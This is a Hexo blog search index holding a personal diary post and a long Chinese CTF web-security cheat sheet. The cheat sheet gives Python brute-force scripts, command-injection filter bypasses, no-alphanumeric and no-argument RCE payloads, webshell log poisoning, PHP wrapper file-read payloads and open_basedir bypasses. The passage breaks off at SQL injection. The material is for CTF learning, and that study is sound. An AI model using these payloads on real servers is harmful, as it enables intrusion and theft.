<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HVV后的一些感想以及博客主题的更新</title>
      <link href="2021/05/01/%E8%BF%91%E5%86%B5(HVV%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%84%9F%E6%83%B3%E4%BB%A5%E5%8F%8A%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9A%84%E6%9B%B4%E6%96%B0)/"/>
      <url>2021/05/01/%E8%BF%91%E5%86%B5(HVV%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%84%9F%E6%83%B3%E4%BB%A5%E5%8F%8A%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9A%84%E6%9B%B4%E6%96%B0)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><p>那么直接进入正文吧<br>首先就是这次活动最大的收获是大抵就是信息收集能力的健长<br> (算是对渗透测试的本质就是信息收集这句话有了切实的体会)<br>还有就是对一些工具的利用啊啥的，重要的还是后续的学习，msf、cs、免杀、内网这些都还需下苦工，不过最近大概是想趁51休息一下，同时将之前落下的课程都补回来吧</p><p>其次就是博客主题又一次的更换了–自搭建来大概5个月左右，每次都讲就用这个主题就好了，然后还是换了好多<br><img src="https://i.loli.net/2021/05/01/doE8Ohci46D1tr2.jpg" alt="hexo-theme-yun"></p><p><img src="https://i.loli.net/2021/05/01/zYHJfTvSa3LK6Cb.png" alt="hexo-theme-fluid"></p><p>再说就是最近的身体状态确实是有所长进的，首先就是体力的增长了，昨天迫不及待就去东体恢复一下状态。<br>从一开始只能间歇的10公里/h到如今12，体力确实是有长进的（每次都是先用10分钟跑步热身）最近都练胸部和腹部力量，下肢可能也得补上了。还有个问题就是虽然感觉体脂确实是下降了的，但体重似乎没变化，一直稳定在130斤左右</p><p>然后就是游泳馆🏊也开了，还有恒温系统！怎么就不早点弄！！16周的游泳课跑了8周的操场（两周的假期）<br>下午去试试吧</p><p>还有！！！打了一周的完美准备手打重回C+，结果刚回来舍友就告诉我要排位重置了，我直接裂开，但这也未尝不是好事–，争取定位高点吧</p><p>还有就是要继续看书~~~</p><p>最后就是好好利用好五一假期吧，第一次留校过节，其实还是挺舒服的</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web知识小记（长期更|大概）</title>
      <link href="2021/04/21/web%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%B0/"/>
      <url>2021/04/21/web%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇长期更新，大概就是总结一下一直以来刷的web题中的一些小知识</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul><li>查看源代码：右键点击，有时会出现右键被禁用的情况：view-source:url</li><li>F12看请求包、响应包、Cookie</li><li>（url/editor）某编辑器editor最新版默认配置下，如果目录不存在，则会遍历服务器根目录</li><li>探针：eg雅黑 url/tz.php</li><li>开发人员在各种文档中的一些信息泄漏（账户密码？）、管理员邮件、帐号</li><li>真实ip、子域名、旁站</li><li>源码泄漏：<br>常见网站源码备份名：web、www、website、backup、back、wwwroot、temp<br>常见网站源码备份后缀：tar、tar.gz、zip、rar<br>.git、.svn、.hg、.DS_Store、CVS</li><li>phps：xxx.php -&gt; xxx.phps</li><li>mdb文件：早期asp+access构架的数据库文件，该文件泄漏相当于数据库被tuoku</li><li>WEB-INF/web.xml<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件</li></ul><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><ul><li><p>子域名爆破、目录爆破</p></li><li><p>token</p></li><li><p>利用得到的信息进行爆破<br>比方说ctfshowweb27：<br><img src="https://i.loli.net/2021/04/06/zd6Qf3qLvyog7Y4.png">可以利用姓名和身份证查询学号(录取时的查询系统)，而身份证被部分打码，这时就可以写脚本爆破（身份证是有规律的，爆破结合社工更有效率）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url/info/checkdb.php&quot;</span></span><br><span class="line">usr = [<span class="string">&#x27;高先伊&#x27;</span>, <span class="string">&#x27;嵇开梦&#x27;</span>, <span class="string">&#x27;郎康焕&#x27;</span>, <span class="string">&#x27;元羿谆&#x27;</span>, <span class="string">&#x27;祁落兴&#x27;</span>]</span><br><span class="line">card1 = [<span class="string">&#x27;621022&#x27;</span>, <span class="string">&#x27;360730&#x27;</span>, <span class="string">&#x27;522601&#x27;</span>, <span class="string">&#x27;45102&#x27;</span>, <span class="string">&#x27;410927&#x27;</span>]</span><br><span class="line">card2 = [<span class="string">&#x27;5237&#x27;</span>, <span class="string">&#x27;7653&#x27;</span>, <span class="string">&#x27;8092&#x27;</span>, <span class="string">&#x27;3419&#x27;</span>, <span class="string">&#x27;5570&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    a, b, c = usr[j], card1[j], card2[j]</span><br><span class="line">    <span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1990</span>, <span class="number">1993</span>):</span><br><span class="line">        <span class="keyword">for</span> mon <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">            <span class="keyword">for</span> day <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">                <span class="keyword">if</span> mon == <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">if</span> year % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> year % <span class="number">100</span> != <span class="number">0</span> <span class="keyword">or</span> year % <span class="number">400</span> <span class="keyword">and</span> day &gt; <span class="number">29</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> day &gt; <span class="number">28</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> mon <span class="keyword">in</span> [<span class="number">4</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>] <span class="keyword">and</span> day &gt; <span class="number">30</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                card = b + <span class="built_in">str</span>(<span class="string">&quot;%d&quot;</span> % year) + <span class="built_in">str</span>(<span class="string">&quot;%02d&quot;</span> % mon) + <span class="built_in">str</span>(<span class="string">&quot;%02d&quot;</span> % day) + c</span><br><span class="line">                payload = <span class="built_in">dict</span>(a=a, p=card)</span><br><span class="line">  r = requests.post(url, data=payload)</span><br><span class="line">                print(payload, r.text)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>tomcat认证爆破：<br>1、burps抓包，利用字典爆破。（ctfshowweb21）<br>ps：利用custom iterator(自定义迭代器)：Payload set —-&gt;custom iterator<br>需要进行base64编码；payload processing 进行编码设置<br>取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 == 这样就会影响base64 加密的结果<br>2、python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://65efec28-322f-476e-aef1-b6cb3151a201.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">password = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\ls\\Desktop\\最新网站后台密码破解字典.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            password.append(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">    strs = <span class="string">&#x27;admin:&#x27;</span> + p[:-<span class="number">1</span>]</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.get(url, headers=header)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">if</span> rep.status_code == <span class="number">200</span>:</span><br><span class="line">        print(rep.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>mt_rand()、mt_srand(seed)：</p><ul><li><p>mt_srand(seed)：分发seed种子，有了种子后生成随机数<br>ps：php&gt;4.2，随机数生成器自动播种，没必要使用该函数手动播种，<strong>若设置了seed参数，则生成的随机数为伪随机数，即每次访问得到的随机数其实都是一样的</strong>（ctfshowweb24）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重复刷新页面，得到的随机数不变；但每次调用mt_rand()得的随机数不等</span></span><br><span class="line"><span class="comment"># 而mt_rand()+mt_rand()也并不简单的等于对应次数的随机数相加（比这更复杂）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mt_srand(<span class="number">37976766</span>);</span><br><span class="line">    <span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment"># 1669514551</span></span><br><span class="line">    <span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment"># 1927304004</span></span><br><span class="line">    <span class="keyword">echo</span> mt_rand()+mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment"># 2786133454</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>所谓的每次访问不是指一个脚本中重复使用mt_rand()，在同一脚本中，每次调用mt_rand()都会得到不一样的随机数，但调用顺序和其值还是一一对应且固定的。（ctfshowweb25）<br>并且mt_rand()+mt_rand()也并不简单的等于对应次数的随机数相加（比这更复杂，那就难以知晓其值了）<br>解决办法是<a href="https://www.openwall.com/php_mt_seed/%EF%BC%88linux%E4%B8%8B%E5%AE%89%E8%A3%85%EF%BC%89">https://www.openwall.com/php_mt_seed/（linux下安装）</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（kali下解压然后进入目录make就行）</span><br><span class="line">tar -zxvf xxx.tar.gz</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul><li><p>先是常见的命令执行两兄弟：</p><ul><li>eval()：把字符串按照 PHP 代码来计算。 字符串必须是合法的 PHP 代码，且须以分号结尾<br>可见其对命令实现实际是将括号包含的语句插入到自身的位置，那就可以添加各种语句进行截断：?&gt;&lt;?、exit(0)；</li><li>system()：执行 指定的命令， 并输出执行结果<br>成功则返回命令输出的最后一行， 失败则返回 <code>false</code></li></ul></li><li><p>一些符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通配符、占位符：*、？</span><br><span class="line">当一些文件名被禁用，他们就派上用场了</span><br><span class="line">命令分割符（如;被禁用就可以用上）</span><br><span class="line">%0a、%0d    # 换行符、回车符</span><br><span class="line">|           # 第一条命令结果作为第二条命令的输入</span><br><span class="line">||          # 第一条执行失败，执行第二条命令</span><br><span class="line">;           # 连续指令功能。</span><br><span class="line">&amp;           # 连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          # 当第一条执行成功后执行后续命令</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></li><li><p>显示文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev</span><br><span class="line">file_get_content()、show_source()、include()、highlight_file()</span><br><span class="line"></span><br><span class="line">假如:和括号被禁，就需要使用一些无需括号的语言结构，如：echo、print、isset、unset、include、require</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></li><li><p>一些bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">空格：</span><br><span class="line">%09</span><br><span class="line">$IFS$9（url编码下$9为linuxshell进程的第九个参数，始终为空字符）、$&#123;IFS&#125;</span><br><span class="line">&lt;&gt;、&lt;</span><br><span class="line">利用输出作为输入：?a&#x3D;flag.php -&gt; ?a&#x3D;&#123;ls,-l&#125;</span><br><span class="line">黑名单：</span><br><span class="line">通配符、占位符：*、？</span><br><span class="line">夹杂字符：&#39;&#39;、&quot;&quot;、&#96;&#96;、$&#123;x&#125;、$1、\、</span><br><span class="line">$&#123;&#125;:</span><br><span class="line">会识别包含的第一个字符，只要将第一个字符修改为如空格，tab，注释，回车就会避免被直接当成变量，而将其执行为PHP代码</span><br><span class="line">ps:在被“”包裹时候直接$&#123;&#125;是不可以的，因为PHP将会将它识别为可变变量而不是一个PHP代码</span><br><span class="line">利用系统变量切片构造命令：</span><br><span class="line">如&#x2F; &#x3D; $&#123;PATH:0:1&#125; &#x3D; &#x2F;bin&#x2F;xxx[0]</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></li><li><p>无字母数字rce<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a><br>eg：极客大挑战2019 rce me</p><blockquote><p>异或生成命令<img src="https://i.loli.net/2021/04/21/vCOrG7lMoFH2dVa.png"></p><p>执行：<img src="https://i.loli.net/2021/04/21/hiUkTYXbFSc2Cwo.png"><br>同理构造一句话：<br><img src="https://i.loli.net/2021/04/21/BLbCJk12NQGVmtK.png"><br>执行如下：<img src="https://i.loli.net/2021/04/21/1GJSj278QlNWvcg.png"><br>蚁剑连接，disable_function绕过一下即可<br><img src="https://i.loli.net/2021/04/21/967z2HlmZa8cTgJ.png"></p></blockquote></li><li><p>无参数函数rce<br><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">php无参数函数RCE</a><br>eg:GXYCTF禁止套娃<br>执行利用变量获取flag.php，再将其显示出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">scandir(目录,[0|1:升|降序],[context])——列出指定路径中的文件和目录localeconv()——返回一包含本地数字及货币格式信息的数组,数组第一项是.</span><br><span class="line">current()——返回数组中的当前元素值, 默认取第一个值，别名为pos()</span><br><span class="line">array_reverse()——逆向输出数组</span><br><span class="line">array_flip()交换数组的键和值</span><br><span class="line">array_rand()从数组随机一个或多个单元，不断刷新访问就会不断随机返回</span><br><span class="line">最终payload：</span><br><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></li><li><p>利用系统变量切片构造命令（黑名单绕过）</p></li><li><p>一些命令执行读取文件的思路</p><blockquote><p><strong>嵌套eval</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(eval($_GET[1]);&amp;1&#x3D;phpinfo();) (这里的1逃逸出黑名单，可以任意传入)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p><strong>包含日志拿shell</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user_agent：&lt;?php eval($_post[1]);?&gt;</span><br><span class="line">然后include($_GET[1]);&amp;1&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">nginx的日志文件为&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p><strong>利用ssrf</strong>：<br><a href="https://www.jianshu.com/p/7fab00c11770">php curl实现发送get和post请求</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;flag.php&quot;);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">$output &#x3D; curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">print_r($output);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p><strong>伪协议对文件进行读写</strong>：</p><ul><li><p><strong>data://</strong></p><ul><li><code>allow_url_fopen</code> ：on<br><code>allow_url_include</code>：on<br><code>PHP版本 &gt;= 5.2</code></li><li>运用：<code>data:资源类型;编码,内容</code><br><code>?xxx=data://text/plain;base64,(base64编码的内容)</code>或：<code>?xxx=data:text/plain,(url编码的内容)</code></li></ul></li><li><p><strong>php://filter</strong></p><p>参数如下：</p><table><thead><tr><th><strong>php://filter 参数</strong></th><th align="center"></th></tr></thead><tbody><tr><td>名称</td><td align="center">描述</td></tr><tr><td><code>resource=&lt;要过滤的数据流&gt;</code></td><td align="center">必须。它指定了你要筛选过滤的数据流</td></tr><tr><td><code>read=&lt;读链的筛选列表&gt;</code></td><td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td><code>write=&lt;写链的筛选列表&gt;</code></td><td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td><code>&lt;；两个链的筛选列表&gt;</code></td><td align="center">任何没有以<code>read=</code>或<code>write=</code>作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><p>常用：<br>base64：<br>读文件<code>php://filter/read=convert.base64-encode/resource=hhh.php</code><br>写文件就把read改成write就行<br>还有就是在进行base64编码难免生成+=,特别是?&gt;转码后以<code>==</code>结尾，那么可以在不影响代码的情况下修改其末尾：<br><code>&lt;?php system(&#39;tac *.php&#39;);?&gt;aa</code>即可消灭<code>==</code><br>rot13<br>将文件写入：<code>php://filter/write=string.rot13/resource=shell.php</code><br>（若事先将文件内容rot13编码，rot13二次编码后即得到原文）</p></li><li><p><strong>glob://</strong><br>设计缺陷导致的任意<strong>文件名</strong>列出（通常只能列出根目录以及open_basedir下的文件名）</p><ul><li>scandir()+glob://</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#以下三种payload，都可以将扫描结果输出，绝对路径|相对路径都可以</span><br><span class="line">  var_dump(scandir(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;));</span><br><span class="line">  print_r(scandir(&quot;glob:&#x2F;&#x2F;.&#x2F;*&quot;));</span><br><span class="line">  echo json_encode(scandir(&quot;glob:&#x2F;&#x2F;..&#x2F;*&quot;));</span><br><span class="line">  #  以下是学长的碎碎念</span><br><span class="line">  # （关键在于 scandir() + glob伪协议</span><br><span class="line">  # （不过实际上也可以用别的方法来弄，这个涉及到CTF。。一般来说不会这么绝</span><br><span class="line">  # （比如 opendir 吧</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><ul><li>DirectoryIterator+glob://<br>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  &lt;?php </span><br><span class="line">      $a&#x3D;new directoryiterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;); </span><br><span class="line">  foreach($a as $f) &#123;</span><br><span class="line">    echo($f-&gt;__tostring().&#39; &#39;); </span><br><span class="line">  &#125; </span><br><span class="line">?&gt;</span><br><span class="line">  # glob:&#x2F;&#x2F;&#x2F;*会列出根目录下的文件</span><br><span class="line"># glob:&#x2F;&#x2F;*会列出open_basedir允许目录下的文件</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><ul><li>opendir()+readdir()+glob://</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ( $b &#x3D; opendir(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;) ) &#123;</span><br><span class="line">    while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;</span><br><span class="line">        echo $file.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">?&gt;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></li></ul></blockquote></li></ul><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul><li><p>伪协议的运用</p><ul><li>过滤器filter://：<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></li><li>data://：<br>某些字符串被过滤，可以使用data编码后传入<br>如：php被替换为???，那么<br><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs</code></li></ul></li><li><p>日志文件包含getshell</p><ul><li>一些日志文件默认路径：<br>nginx日志文件：<code>/var/log/nginx/access.log</code><br>apache日志文件：<code>/var/log/ apache | apache2 | httpd /access.log</code><br>iis日志文件：<code>%systemroot%\system32\logfiles\</code></li><li>在ua头写一句话，再传参包含即可</li></ul></li><li><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php.ini关于session.upload的一些默认配置：</span><br><span class="line"><span class="comment"># 表示upload_progress功能开始，意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 </span></span><br><span class="line"><span class="number">1.</span> session.upload_progress.enabled = on</span><br><span class="line"><span class="number">2.</span> session.upload_progress.cleanup = on<span class="comment"># 表示上传结束后php会立即清空对应session文件中的内容</span></span><br><span class="line"><span class="comment"># prefix+name将表示为session中的键名</span></span><br><span class="line"><span class="number">3.</span> session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="number">4.</span> session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br></pre></td></tr></table></figure><ul><li>session.auto_start=on，php接收请求时自动初始化session，无需session_start()</li><li>session.use_strict_mode=on，session_id可控，由此文件名可控：<br>可通过自定义cookie如：PHPSEID=xxx，来控制php生成的临时文件名：/tmp/sess_xxx<br>此时即使用户未自定义session，php也会自动将session初始化，产生一个键值写入sess_xxx文件里：<br><code>ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name</code></li><li>session.upload_progress.cleanup=on，导致文件上传后session内容会自动清空，这是就要利用到条件竞争</li></ul></li></ul><h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h2 id="强-弱比较"><a href="#强-弱比较" class="headerlink" title="强|弱比较"></a>强|弱比较</h2><p>强比较<code>===</code>：先比较类型是否相同；再比较值</p><p>弱类型比较<code>==</code>：会将字符类型转换为相同类型，在比较值<br>（ps：若比较数字和字符串 | 涉及数字内容的字符串；则字符串会转换为数值并按数值进行比较）</p><blockquote><p>eg：</p><p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&quot;admin&quot;&#x3D;&#x3D;0);  &#x2F;&#x2F;true# admin为字符串，转换即为0</span><br><span class="line">var_dump(&quot;1admin&quot;&#x3D;&#x3D;1); &#x2F;&#x2F;true# 字符串中的数值的开始部分决定了其值</span><br><span class="line">var_dump(&quot;admin1&quot;&#x3D;&#x3D;1) &#x2F;&#x2F;false</span><br><span class="line">var_dump(&quot;admin1&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">var_dump(&quot;0e123456&quot;&#x3D;&#x3D;&quot;0e4456789&quot;); &#x2F;&#x2F;true # 将0e|0E识别为科学计数法；而0的n次方始终为0，故相等</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></blockquote><h2 id="各种函数"><a href="#各种函数" class="headerlink" title="各种函数"></a>各种函数</h2><h3 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h3><blockquote><p>利用md5($pass,true)构造万能密码sql注入</p><ul><li><p>后端查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br><span 